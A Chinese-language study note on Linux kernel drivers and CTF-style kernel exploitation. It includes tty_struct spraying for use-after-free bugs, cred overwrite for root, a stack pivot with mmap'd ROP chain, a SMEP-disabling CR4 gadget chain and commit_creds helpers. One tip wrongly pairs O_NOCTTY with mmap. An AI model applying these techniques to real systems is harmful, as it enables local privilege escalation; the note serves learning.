[TOC]

### 驱动编程

书籍：
[linux设备驱动](https://www.kancloud.cn/kancloud/ldd3)

动态分配设备号
```c
int alloc_chrdev_region(dev_t *dev, unsigned int firstminor, unsigned int count, char *name);
```

dev是传出参数，为动态获得的设备号；firstminor指定第一个minor；count和name同register_chrdev_region的参数定义。
[http://nanxiao.me/linux-kernel-note-20-device-major-minor-number/]()

静态初始化字符设备：
```c
struct cdev my_cdev;

cdev_init(&my_cdev, &fops);

my_cdev.owner = THIS_MODULE;
```
[ Linux字符设备驱动之cdev_init()系列 ](http://blog.csdn.net/tigerjibo/article/details/6412613)

class相关api
![ ](http://images.cnitblog.com/blog/497634/201305/15222645-cd23dedafac144bbbb027aa4bc5c79b8.jpg  "class相关api")

[class_create和class_register](http://www.cnblogs.com/skywang12345/archive/2013/05/15/driver_class.html)

### 解压cpio格式的rootfs

rootfs.cpio是先cpio打包再gzip压缩

解压要先把rootfs.cpio改成gz后缀再解压，否则会报错。

### exploit tech & tricks

#### tty_struct spray

`man 4 ptmx`可以了解到:
```
When a process opens /dev/ptmx, it gets a file descriptor for a pseudoterminal master (PTM), and a pseudoterminal slave (PTS) device is created in the /dev/pts directory. Each file descriptor obtained by opening /dev/ptmx is an independent PTM with its own associated PTS, whose path can be found by passing the descriptor to ptsname(3). 
```

也就是新建了一个`tty_struct`,而这个结构[tty_struct](http://elixir.free-electrons.com/linux/v4.4.72/source/include/linux/tty.h#L259)里有个字段`const struct tty_oprations* ops`我们可以将其改写成某个包含恶意函数指针的地址，比如在没有`SMAP`的时候可以直接指向用户空间，从而控制执行流。

所以在存在uaf的情况下，可以spray大量`tty_struct`从而占坑我们之前释放的chunk，然后uaf将`ops`改成自己的地址。

参考practice：[simple kernel exploit challenge](http://bobao.360.cn/learning/detail/4148.html)

#### uaf use struct cred

与`tty_struct spary`类似，也是占坑，如果`fork`一个子进程能刚好令子进程的`cred`结构进入我们想要的位置，那么就可以直接改写`cred`的内容从而提权。

参考practice：[simple kernel exploit challenge](http://bobao.360.cn/learning/detail/4148.html)

#### stack pivot

如果调用指针时刚好是`call rax`，那么可以将这个指针改成`xchg eax, esp`的gadget，然后在用户空间的eax处（即`xchg eax, esp`gadget的地址与`0xffffffff`位与的值）mmap出一块内存，然后将ropchain写入这块内存，即可`stack pivot`,eg：
```c
159. unsigned long lower_address = xchgeaxesp & 0xFFFFFFFF;
160. unsigned long base = lower_address & ~0xfff;
161. printf("[+] Base address is %lx\n", base);
162. if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) {
163.  perror("mmap");
164. exit(1);
165. }
166. 
167. unsigned long rop_chain[] = {
		......
180. };
181. memcpy((void*)lower_address, rop_chain, sizeof(rop_chain));
```

#### Mitigration

_checksec_

* kaslr 可通过`cat /proc/cmdline`来查看，选项若有kaslr则是开启，一般内核默认不开启。
* smep可以通过`cat /proc/cpuinfo`查看flags有没有smep

_Bypass_

* SMEP
smep通过清除CR4的第20个bit来关闭，一般通过以下gadget实现：
```asm

    POP RDI; RET // place 00000000000006f0 in RDI
    MOV CR4, RDI; RET // SMEP disbled !
    #64位下大多数就是pop一下0x6f0就行了

```
参考：[linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric](http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/)

#### something

* 内核里rsp是8字节对齐的
* `tty_struct`的magic可能为：
```
#define TTY_STRUCT_MAGIC 0x5402
#define TTY_MAGIC 0x5401
```
[magic number](https://dri.freedesktop.org/docs/drm/process/magic-number.html)

* 使用`mmap`时一般要加上`O_NOCTTY`,因为：
```
标志O_NOCTTY可以告诉UNIX这个程序不会成为这个端口上的“控制终端”。如果不这样做的话，所有的输入，比如键盘上过来的Ctrl+C中止信号等等，会影响到你的进程
```
* 不知道linux内核结构大小可以编译一个模块，模块源码使用`sizeof`然后编译器优化的缘故，会直接编码大小，然后`objdump -d`查看汇编就可以知道大小了，但是也要注意选项。
* 定义内核函数一般用以下形式(在直到函数地址后)
```c
typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);

commit_creds_func commit_creds = (commit_creds_func)0xffffffff810a1420;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func)0xffffffff810a1810;
```
 使用`regparm`是因为内核函数调用约定和用户态不一样，32位使用三个寄存器传递前三个参数的，参考[gcc function attribute](https://gcc.gnu.org/onlinedocs/gcc-4.0.0/gcc/Function-Attributes.html)
 
 	 Your are probably thinking normal calling convention (arguments on the stack). Modern Linux kernels (32-bit variants) pass the first 3 parameters in registers (EAX, ECX, EDX) as an optimization. Depending on the kernel this convention is specified as an attribute modifier on the functions using __attribute__(regparm(3)), or modern versions of the kernel pass -mregparm=3 option to GCC on the command line. The GCC documentation says this about that option/attribute:
 
 参考：[Function parameter passing in a Linux kernel interrupt handler (from asm to C)](https://stackoverflow.com/questions/33932394/function-parameter-passing-in-a-linux-kernel-interrupt-handler-from-asm-to-c)
 
* 保存用户态的状态:
```c 
unsigned long user_cs, user_ss, user_eflags;

void save_stats() {
    asm(
    "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "pushfq\n"
            "popq %2\n"
    :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags)
    :
    :"memory"
    );
}
```

### 内核Debug

#### 启动

qemu可以直接加参数`-gdb tcp::23333`,但是要注意gdb连接server时候会出错，所以要用`set architecture i386:x86-64`指定构架然后`target remote :23333`连接。

参考：[https://stackoverflow.com/questions/8662468/remote-g-packet-reply-is-too-long]()

#### kallsyms

大部分时候我们是调试驱动，而kallsyms拥有内核中所有的符号，也包括了驱动模块的，所以可以查看kallsyms来下模块的断点。

### 制作cpio，initramfs文件系统

需要两个工具，一个是进入内核源码编译的：
`make -C /usr/src/linux/usr/ gen_init_cpio`
一个是内核源码目录script下的`chmod +x usr/gen_init_cpio scripts/gen_initramfs_list.sh `

然后通过以下命令创建initramfs文件系统：

```shell
gen_initramfs_list.sh initrd/ > filelist
gen_init_cpio filelist >initrd.img
gzip initrd.img
mv initrd.img initrd-`uname –r`.img
```

### 关于cred结构

默认编译的cred前5个字段为:
```c
struct cred {
	unsigned long usage;
	unsigned int uid;
	unsigned int gid;
	unsigned int suid;
	unsigned int sgid;
	unsigned int euid;
	...
};
```

测试要把这些字段全部清零才能获得root权限,usage字段是跟bit有关的，32位下是`unsigned int`，在64位下，默认设置的cred结构是0xa8字节大小

### 返回用户态

64位下使用的是`swapgs`和`iretq`，前者将gs和MSR的数据进行交换，后者会从栈上按以下顺序弹出数据：
```

    the next RIP
    user land CS
    user land EFLAGS
    user land RSP
    user land SS

```

### 单文件源码内核模块编译

[内核模块的基本编写以及Makefile的编写 ](http://blog.csdn.net/yby19870627/article/details/7360259)

### 获得内核编译选项

有时候我们希望获得内核编译时的选项，如要获得一个结构的大小(此时光有源码是不够的)，可以通过以下方式获取：

在运行时：

```shell
#Current kernel config:

cat /boot/config-`uname -r`

#Other installed kernels:

ls /boot/config-*

#以下三种都是可能的

 /proc/config.gz
 /boot/config
 /boot/config-$(uname -r)
```

拥有镜像时：
这时候需要用到内核源码下`scripts/extract-ikconfig`脚本来获取镜像中的config，但是这也需要内核在编译时启用了`CONFIG_IKCONFIG_PROC`选项。

### 从被压缩的镜像中提取vmlinux

使用内核源码里的`scripts/extract-vmlinux`就能很容易提取出来了：
`./extract-vmlinux bzImage > vmlinx`

### linux kernel

#### stack

[Linux 中的各种栈：进程栈 线程栈 内核栈 中断栈](http://kyang.cc/2016/08/26/Linux-%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E6%A0%88%EF%BC%9A%E8%BF%9B%E7%A8%8B%E6%A0%88-%E7%BA%BF%E7%A8%8B%E6%A0%88-%E5%86%85%E6%A0%B8%E6%A0%88-%E4%B8%AD%E6%96%AD%E6%A0%88/)

#### tty/pty/ptmx

[Linux下tty/pty/pts/ptmx详解 ](http://blog.csdn.net/tenfyguo/article/details/5742389)
[浅析terminal创建时ptmx和pts关系](http://www.cnblogs.com/johnnyflute/p/3523409.html)

#### 调用约定64位
32位的可以参考上面的
```
A.2 AMD64 Linux Kernel Conventions

1. User-level applications use as integer registers for passing the sequence
%rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi,
%rsi, %rdx, %r10, %r8 and %r9.

2. A system-call is done via the syscall instruction. The kernel destroys
registers %rcx and %r11.

3. The number of the syscall has to be passed in register %rax.
4. System-calls are limited to six arguments, no argument is passed directly on
the stack.

5. Returning from the syscall, register %rax contains the result of the
system-call. A value in the range between -4095 and -1 indicates an error,
it is -errno.

6. Only values of class INTEGER or class MEMORY are passed to the kernel.
```

### 暂时没懂

看别人的wp时发现改写`tty_struct`的`ops`指针后还要申请一块内存把指针写入`ops`指向的`proc_fops`:
```c
   struct tty_operations* fake_tty_operations = (struct tty_operations*) calloc(1, sizeof(struct tty_operations));
    void *fake_file_operations = calloc(1, 0x1000);

    fake_tty_operations->proc_fops = fake_file_operations;
    fake_tty_operations->ioctl = (int (*)())xchg_eax_esp_ret;
```
暂时不明白用意...